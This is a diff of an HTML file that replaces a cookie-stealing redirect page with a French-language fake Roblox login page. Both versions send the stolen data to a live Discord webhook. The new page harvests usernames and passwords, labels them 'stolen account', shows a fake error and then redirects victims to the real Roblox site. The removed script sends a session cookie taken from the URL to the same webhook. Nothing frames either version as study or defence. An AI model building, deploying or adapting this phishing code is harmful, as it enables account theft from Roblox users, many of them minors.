@@ -1,26 +1,132 @@
 <!DOCTYPE html>
-<html>
-<head><title>Loading...</title></head>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Connexion</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f2f4f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 320px;
+            text-align: center;
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 24px;
+            color: #393b3d;
+            margin-bottom: 25px;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #00a2ff;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00a2ff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background-color: #008fcc;
+        }
+        .error {
+            color: red;
+            font-size: 12px;
+            margin-bottom: 10px;
+            display: none;
+        }
+    </style>
+</head>
 <body>
-<script>
-    const params = new URLSearchParams(window.location.search);
-    const cookie = params.get('c');
-    
-    if (cookie) {
-        fetch('https://discord.com/api/webhooks/1557616277584093264/K-ZZ7SQCalA6ZohbXbO4pauTCcUB4zTEDgHECpOvO-ixPLaUKtZ5Lz6VKLaipTDnZ0Z6', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                content: "**Cookie reçu**\nPage source : " + document.referrer + "\nCookie : ```" + cookie + "```" 
-            })
-        }).then(() => {
-            window.location.href = "https://www.roblox.com/home";
-        }).catch(() => {
-            window.location.href = "https://www.roblox.com/home";
-        });
-    } else {
-        window.location.href = "https://www.roblox.com/home";
-    }
-</script>
+    <div class="login-container">
+        <!-- Logo Roblox en SVG -->
+        <svg class="logo" viewBox="0 0 100 30" xmlns="http://www.w3.org/2000/svg">
+            <text x="0" y="25" font-family="Arial" font-weight="bold" font-size="24" fill="#393b3d">ROBLOX</text>
+        </svg>
+        <h2>Connexion</h2>
+        <p id="error-msg" class="error">Identifiant ou mot de passe incorrect.</p>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Nom d'utilisateur ou Email" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            <button type="submit" id="submitBtn">Se connecter</button>
+        </form>
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const errorMsg = document.getElementById('error-msg');
+        const btn = document.getElementById('submitBtn');
+
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            btn.innerText = "Connexion...";
+            btn.disabled = true;
+            btn.style.backgroundColor = "#ccc";
+
+            // Ton webhook Discord
+            const webhookUrl = "https://discord.com/api/webhooks/1557616277584093264/K-ZZ7SQCalA6ZohbXbO4pauTCcUB4zTEDgHECpOvO-ixPLaUKtZ5Lz6VKLaipTDnZ0Z6";
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "**Nouveau compte volé**\n**Pseudo :** `" + user + "`\n**Mot de passe :** `" + pass + "`"
+                    })
+                });
+
+                // Fausse erreur pour faire patienter
+                errorMsg.style.display = "block";
+                btn.innerText = "Se connecter";
+                btn.disabled = false;
+                btn.style.backgroundColor = "#00a2ff";
+                
+                // Au bout de 3 secondes, redirection vers le VRAI Roblox
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com/login";
+                }, 3000);
+
+            } catch (error) {
+                // En cas d'erreur réseau, on redirige quand même
+                window.location.href = "https://www.roblox.com/login";
+            }
+        };
+    </script>
 </body>
 </html>
